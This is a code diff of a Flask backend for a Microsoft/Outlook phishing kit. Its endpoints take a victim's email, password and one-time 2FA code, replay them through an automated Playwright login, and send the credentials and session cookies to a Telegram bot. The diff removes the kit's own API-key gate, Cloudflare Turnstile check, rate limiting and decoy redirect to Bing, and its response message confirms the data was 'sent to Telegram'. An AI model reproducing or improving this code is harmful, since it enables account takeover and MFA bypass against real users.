@@ -2,11 +2,9 @@ import os
 import datetime
 import json
 import base64
-import secrets
 import time
-from collections import defaultdict
 import requests
-from flask import Flask, request, jsonify, redirect, make_response
+from flask import Flask, request, jsonify, redirect
 from flask_cors import CORS
 from playwright.sync_api import sync_playwright
 
@@ -14,44 +12,13 @@ app = Flask(__name__)
 CORS(app)
 
 # ========== ENVIRONMENT VARIABLES ==========
-API_KEY = os.environ.get("API_KEY", "your-secret-key-here")
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
-TURNSTILE_SECRET_KEY = os.environ.get("TURNSTILE_SECRET_KEY")
 
 if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
     raise RuntimeError("Telegram credentials missing")
-if not TURNSTILE_SECRET_KEY:
-    raise RuntimeError("TURNSTILE_SECRET_KEY missing")
 
 MICROSOFT_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&prompt=select_account"
-
-# ========== ANTI‑BOT TOKEN STORAGE ==========
-tokens = {}
-ip_requests = defaultdict(list)
-
-def is_rate_limited(ip, limit=3, window=3600):
-    now = time.time()
-    ip_requests[ip] = [t for t in ip_requests[ip] if t > now - window]
-    if len(ip_requests[ip]) >= limit:
-        return True
-    ip_requests[ip].append(now)
-    return False
-
-# ========== VERIFY CLOUDFLARE TURNSTILE ==========
-def verify_turnstile(token, client_ip):
-    url = "https://challenges.cloudflare.com/turnstile/v0/siteverify"
-    data = {
-        "secret": TURNSTILE_SECRET_KEY,
-        "response": token,
-        "remoteip": client_ip
-    }
-    try:
-        resp = requests.post(url, data=data, timeout=5)
-        result = resp.json()
-        return result.get("success", False)
-    except:
-        return False
 
 # ========== PLAYWRIGHT LOGIN ==========
 def attempt_login(email, password, totp_code=None):
@@ -118,22 +85,8 @@ def send_to_telegram(email, password, cookies):
         print(f"Telegram error: {e}")
 
 # ========== API ENDPOINTS ==========
-@app.route("/verify-turnstile", methods=["POST"])
-def verify_turnstile_endpoint():
-    if request.headers.get("X-API-Key") != API_KEY:
-        return jsonify({"error": "Unauthorized"}), 401
-    data = request.get_json()
-    token = data.get("cf_token")
-    if not token:
-        return jsonify({"success": False, "error": "Missing token"}), 400
-    client_ip = request.remote_addr
-    ok = verify_turnstile(token, client_ip)
-    return jsonify({"success": ok})
-
 @app.route("/login/step1", methods=["POST"])
 def login_step1():
-    if request.headers.get("X-API-Key") != API_KEY:
-        return jsonify({"error": "Unauthorized"}), 401
     data = request.get_json()
     email = data.get("email")
     password = data.get("password")
@@ -150,39 +103,18 @@ def login_step1():
 
 @app.route("/login/step2", methods=["POST"])
 def login_step2():
-    if request.headers.get("X-API-Key") != API_KEY:
-        return jsonify({"error": "Unauthorized"}), 401
     data = request.get_json()
     email = data.get("email")
     password = data.get("password")
     totp = data.get("totp")
     if not email or not password or not totp:
         return jsonify({"error": "Missing email, password, or TOTP"}), 400
-    client_ip = request.remote_addr
-    if is_rate_limited(client_ip):
-        return jsonify({"error": "Too many attempts. Try again later."}), 429
     cookies, err = attempt_login(email, password, totp)
     if cookies:
         send_to_telegram(email, password, cookies)
-        token = secrets.token_urlsafe(32)
-        expires = int(time.time()) + 60
-        tokens[token] = {"email": email, "expires": expires}
-        redirect_url = f"/go-to-bing?token={token}"
-        return jsonify({"status": "success", "redirect_url": redirect_url})
+        return jsonify({"status": "success", "message": "2FA completed, sent to Telegram"})
     else:
         return jsonify({"status": "error", "error": err}), 400
-
-@app.route("/go-to-bing", methods=["GET"])
-def go_to_bing():
-    token = request.args.get("token")
-    if not token or token not in tokens:
-        return "Invalid or missing token", 403
-    data = tokens[token]
-    if data["expires"] < time.time():
-        del tokens[token]
-        return "Token expired", 403
-    del tokens[token]
-    return redirect("https://www.bing.com")
 
 @app.route("/health", methods=["GET"])
 def health():
